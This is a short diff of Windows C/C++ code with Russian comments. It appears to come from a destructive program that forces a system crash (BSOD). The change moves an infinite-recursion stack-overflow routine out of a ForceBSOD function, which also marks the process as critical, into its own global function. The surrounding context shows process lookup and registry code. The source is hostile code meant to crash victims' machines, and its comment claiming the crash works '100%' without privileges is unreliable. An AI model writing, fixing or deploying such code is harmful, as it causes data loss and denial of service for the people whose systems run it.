@@ -389,7 +389,16 @@ DWORD GetProcessIdByName(const char* procName) {
     return 0;
 }
 
-// ГАРАНТИРОВАННЫЙ BSOD — убиваем критический процесс
+// ==================== STACK OVERFLOW ДЛЯ BSOD ====================
+
+// ВЫНОСИМ Crash() В ОТДЕЛЬНУЮ ГЛОБАЛЬНУЮ ФУНКЦИЮ
+__declspec(noinline) VOID StackOverflowCrash() {
+    volatile int buffer[8192] = {0};
+    StackOverflowCrash();  // Бесконечная рекурсия → переполнение стека → BSOD
+}
+
+// ==================== ГАРАНТИРОВАННЫЙ BSOD ====================
+
 VOID WINAPI ForceBSOD() {
     // Делаем наш процесс критическим (если ещё не сделали)
     ProcessIsCritical();
@@ -417,11 +426,7 @@ VOID WINAPI ForceBSOD() {
     }
     
     // Вариант 3: Stack Overflow (100% работает даже если нет прав)
-    __declspec(noinline) VOID Crash() {
-        volatile int buffer[8192] = {0};
-        Crash();
-    }
-    Crash();
+    StackOverflowCrash();  // ← ВЫЗЫВАЕМ ОТДЕЛЬНУЮ ФУНКЦИЮ
 }
 
 // ==================== РЕЕСТР ====================
